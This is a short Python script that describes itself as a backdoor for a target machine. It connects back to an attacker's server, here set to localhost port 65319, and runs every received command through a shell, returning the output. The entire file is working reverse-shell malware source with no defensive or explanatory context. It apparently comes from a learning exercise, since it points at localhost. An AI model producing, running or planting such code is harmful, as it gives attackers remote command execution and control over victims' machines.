# -*- Coding : utf-8 -*-

"""
    Backdoor to execute on target machine.
    Connect to the server running on attacker machine.
"""

import socket, subprocess

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode()
            return data
        except ValueError:
            continue



def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command == "help":
            pass
        elif command == "clear":
            pass

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            s.send(result) # result contain bytes, so no need to encode it

    s.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 65319))
shell()


